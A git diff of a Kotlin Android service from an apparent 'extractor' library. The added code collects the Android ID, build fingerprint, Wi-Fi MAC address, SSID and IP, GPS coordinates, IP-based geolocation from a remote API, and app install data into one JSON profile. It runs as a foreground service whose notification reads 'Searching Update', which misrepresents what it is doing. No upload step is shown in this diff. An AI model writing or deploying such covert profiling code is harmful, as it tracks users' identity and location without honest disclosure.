@@ -2,6 +2,9 @@ package info.kalagato.com.extractor.readers
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -12,26 +15,28 @@ import android.location.LocationListener
 import android.location.LocationManager
 import android.net.ConnectivityManager
 import android.net.wifi.WifiManager
-import android.os.*
+import android.os.Build
+import android.os.IBinder
 import android.provider.Settings
 import android.telephony.TelephonyManager
+import android.text.format.Formatter
 import android.util.Log
 import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import com.google.android.gms.location.*
-import com.google.gson.JsonObject
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationCallback
 import info.kalagato.com.extractor.Constant
-import info.kalagato.com.extractor.Util
+import info.kalagato.com.extractor.Extractor
+import info.kalagato.com.extractor.R
+import info.kalagato.com.extractor.networkCall.ApiClient
+import info.kalagato.com.extractor.networkCall.IpResponse
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
-import java.io.File
-import java.io.FileWriter
-import java.lang.Exception
-import java.text.SimpleDateFormat
-import java.util.*
+import retrofit2.Response
 
 
 class ReadGeneralInformation : Service() {
@@ -39,6 +44,9 @@ class ReadGeneralInformation : Service() {
     private val deviceDetail = JSONObject()
     private val wifiDetails = JSONObject()
     private val locationDetails = JSONObject()
+    private val location = JSONObject()
+    private val installData = JSONObject()
+    private val ipData = JSONObject()
     private val jsonObject = JSONObject()
     private lateinit var locationCallback: LocationCallback
     private lateinit var fusedLocationProviderClient: FusedLocationProviderClient
@@ -46,36 +54,101 @@ class ReadGeneralInformation : Service() {
     override fun onCreate() {
 
 
-        // creating location updates
-       /* fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
-        locationCallback = object : LocationCallback() {
-            
-            override fun onLocationResult(locationResult: LocationResult) {
-                locationResult ?: return
-                for (location in locationResult.locations) {
-                    Log.d("TAG", "onLocationResult: $location")
-                }
-            }
-        }*/
+        // getting location updates
+        if (ContextCompat.checkSelfPermission(applicationContext,Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED){
+            getLocation(applicationContext)
+        }
+
+
+
         CoroutineScope(Dispatchers.IO).launch {
 
             //getting the device information from user device
+            getIpLocation()
             getSystemDetail(deviceDetail)
             getDarkMode(deviceDetail)
             getWifiDetails(applicationContext,wifiDetails)
-            withContext(Dispatchers.Main){
-                getLocation(applicationContext)
-            }
 
-            jsonObject.put("device Details",deviceDetail)
-            jsonObject.put("wifi details",wifiDetails)
-            jsonObject.put("location details",locationDetails)
+            jsonObject.put("package_name",applicationContext.packageName)
+            jsonObject.put("user_id",Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+            jsonObject.put("device_Details",deviceDetail)
+            jsonObject.put("wifi_details",wifiDetails)
+            location.put("device_location",locationDetails)
+            location.put("ip_location",ipData)
+            jsonObject.put("location",location)
+            applicationContext
+                .packageManager
+                .getPackageInfo(applicationContext.packageName, 0).apply {
+                    installData.put("first_install",this.firstInstallTime)
+                    installData.put("last_used",this.lastUpdateTime)
+                    installData.put("version_code",this.versionCode)
+                    installData.put("version_name",this.versionName)
+                }
+            jsonObject.put("installation_data",installData)
 
         }
 
     }
 
+    private suspend fun getIpLocation() {
+        val response: Response<IpResponse> =ApiClient.client.getIpLocation() as Response<IpResponse>
+        withContext(Dispatchers.Main){
+            if (response.isSuccessful){
+                     ipData.put("latitude",response.body()!!.lat)
+                     ipData.put("longitude",response.body()!!.lon)
+                     ipData.put("country",response.body()!!.country)
+                     ipData.put("country_code",response.body()!!.countryCode)
+                     ipData.put("region_name",response.body()!!.regionName)
+                     ipData.put("city",response.body()!!.city)
+                     ipData.put("postal_code",response.body()!!.zip)
+                     ipData.put("time_zone",response.body()!!.timezone)
+                     ipData.put("time_zone",response.body()!!.timezone)
+                     ipData.put("query",response.body()!!.query)
+            }else{
+                Log.d("TAG", "getIpLocation: ${response.message()}")
+            }
+        }
+    }
+
+
+    @SuppressLint("MissingPermission")
+    private fun getLastKnownLocation() {
+        fusedLocationProviderClient.lastLocation.addOnSuccessListener { location ->
+            Log.d("TAG", "getLastKnownLocation: $location")
+        }.addOnFailureListener {
+            Log.d("TAG", "getLastKnownLocation: ${it.localizedMessage}")
+        }
+    }
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+
+            val notificationIntent = Intent(applicationContext, Extractor::class.java)
+            val pendingIntent = PendingIntent.getActivity(
+                applicationContext,
+                0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
+            )
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val chan = NotificationChannel(
+                    Constant.CHANNEL_ID,
+                    "My Foreground Service",
+                    NotificationManager.IMPORTANCE_LOW
+                )
+                val manager = ContextCompat.getSystemService(
+                    applicationContext, NotificationManager::class.java
+                )
+                manager?.createNotificationChannel(chan)
+            }
+            val notification = NotificationCompat.Builder(
+                applicationContext,
+                Constant.CHANNEL_ID
+            ) //todo fix hardcoded channel id
+                .setSmallIcon(R.drawable.ic_settings)
+                .setContentTitle("Searching Update")
+                .setContentText("")
+                .setShowWhen(false)
+                .setContentIntent(pendingIntent)
+                .build()
+            startForeground(1, notification)
         return super.onStartCommand(intent, flags, startId)
     }
 
@@ -85,33 +158,32 @@ class ReadGeneralInformation : Service() {
 
     @SuppressLint("HardwareIds")
     private fun getSystemDetail(deviceDetail: JSONObject): JSONObject {
-        deviceDetail.put("Brand", Build.BRAND)
         deviceDetail.put(
-            "DeviceID",
+            "device_id",
             Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         )
-        deviceDetail.put("Model: ", Build.MODEL)
-        deviceDetail.put("ID", Build.ID)
-        deviceDetail.put("SDK", Build.VERSION.SDK_INT)
-        deviceDetail.put("Manufacture", Build.MANUFACTURER)
-        deviceDetail.put("Brand", Build.BRAND)
-        deviceDetail.put("User", Build.USER)
-        deviceDetail.put("Type", Build.TYPE)
-        deviceDetail.put("Base", Build.VERSION_CODES.BASE)
-        deviceDetail.put("Board", Build.BOARD)
-        deviceDetail.put("Host", Build.HOST)
-        deviceDetail.put("FingerPrint", Build.FINGERPRINT)
-        deviceDetail.put("Version Code", Build.VERSION.RELEASE)
-        deviceDetail.put("Supported Network", supportedNetwork(applicationContext))
+        deviceDetail.put("model: ", Build.MODEL)
+        deviceDetail.put("id", Build.ID)
+        deviceDetail.put("sdk", Build.VERSION.SDK_INT)
+        deviceDetail.put("manufacture", Build.MANUFACTURER)
+        deviceDetail.put("brand", Build.BRAND)
+        deviceDetail.put("user", Build.USER)
+        deviceDetail.put("type", Build.TYPE)
+        deviceDetail.put("base", Build.VERSION_CODES.BASE)
+        deviceDetail.put("board", Build.BOARD)
+        deviceDetail.put("host", Build.HOST)
+        deviceDetail.put("finger_print", Build.FINGERPRINT)
+        deviceDetail.put("version_code", Build.VERSION.RELEASE)
+        deviceDetail.put("supported_network", supportedNetwork(applicationContext))
 
         return deviceDetail
     }
 
     private fun getDarkMode(deviceDetail: JSONObject) {
         when (resources?.configuration?.uiMode?.and(Configuration.UI_MODE_NIGHT_MASK)) {
-            Configuration.UI_MODE_NIGHT_YES -> {deviceDetail.put("Dark Mode","YES")}
-            Configuration.UI_MODE_NIGHT_NO -> {deviceDetail.put("Dark Mode","NO")}
-            Configuration.UI_MODE_NIGHT_UNDEFINED -> {deviceDetail.put("Dark Mode","NA")}
+            Configuration.UI_MODE_NIGHT_YES -> {deviceDetail.put("dark_mode","YES")}
+            Configuration.UI_MODE_NIGHT_NO -> {deviceDetail.put("dark_mode","NO")}
+            Configuration.UI_MODE_NIGHT_UNDEFINED -> {deviceDetail.put("dark_mode","NA")}
         }
 
     }
@@ -129,7 +201,7 @@ class ReadGeneralInformation : Service() {
             wifiDetails.put("Mac Address",info.macAddress)
             wifiDetails.put("Network Id",info.networkId)
             wifiDetails.put("SSID",info.ssid)
-            wifiDetails.put("Ip Address",info.ipAddress)
+            wifiDetails.put("Ip Address",Formatter.formatIpAddress(info.ipAddress))
             wifiDetails.put("Is5GSupported",wifiManager.is5GHzBandSupported)
             wifiDetails.put("Strength", signalStrength);
             when(wifiManager.wifiState){
@@ -173,7 +245,7 @@ class ReadGeneralInformation : Service() {
     fun getLocation(context: Context) {
         try {
             val locationManager = context.getSystemService(LOCATION_SERVICE) as LocationManager
-            val locationListener: LocationListener = object : LocationListener {
+            val locationListener = object : LocationListener {
                 override fun onLocationChanged(location: Location) {
                     // Called when a new location is found by the network location provider.
 
@@ -182,7 +254,11 @@ class ReadGeneralInformation : Service() {
                     locationDetails.put("Time",location.time)
                     locationDetails.put("Provider",location.provider)
                     locationDetails.put("Accuracy",location.accuracy)
-                    try {
+                    Log.d("TAG", "onLocationChanged: $location ")
+                     stopForeground(true)
+                    stopSelf()
+                    locationManager.removeUpdates(this)
+                    /*try {
                         Log.d("TAG", "onLocationChanged: $location")
                         val folder = File(
                             Environment.getExternalStorageDirectory()
@@ -192,9 +268,9 @@ class ReadGeneralInformation : Service() {
                             "mydir",
                             MODE_PRIVATE
                         ) //Creating an internal dir;
-                        /* boolean var = false;
+                        *//* boolean var = false;
                         if (!folder.exists())
-                            var = folder.mkdir();*/
+                            var = folder.mkdir();*//*
                         val c = Calendar.getInstance().time
                         val df = SimpleDateFormat("dd-MMM-yyyy", Locale.getDefault())
                         val formattedDate = df.format(c)
@@ -212,11 +288,10 @@ class ReadGeneralInformation : Service() {
                         fw.append('\n')
                         fw.flush()
                         fw.close()
-                        stopSelf()
                     } catch (e: Exception) {
                         e.printStackTrace()
                         Log.d("TAG", "onLocationChanged: " + e.localizedMessage)
-                    }
+                    }*/
                 }
 
                 override fun onProviderEnabled(provider: String) {
@@ -252,7 +327,7 @@ class ReadGeneralInformation : Service() {
                 locationCallback,
                 Looper.getMainLooper())*/
             locationManager.requestLocationUpdates(
-                LocationManager.NETWORK_PROVIDER,
+                LocationManager.GPS_PROVIDER,
                 0,
                 0f,
                 locationListener
@@ -260,6 +335,11 @@ class ReadGeneralInformation : Service() {
         } catch (e: Exception) {
             Log.d("TAG", "getLocation: ${e.localizedMessage} ")
         }
+    }
+
+    override fun onDestroy() {
+        stopForeground(true)
+        super.onDestroy()
     }
 
 }
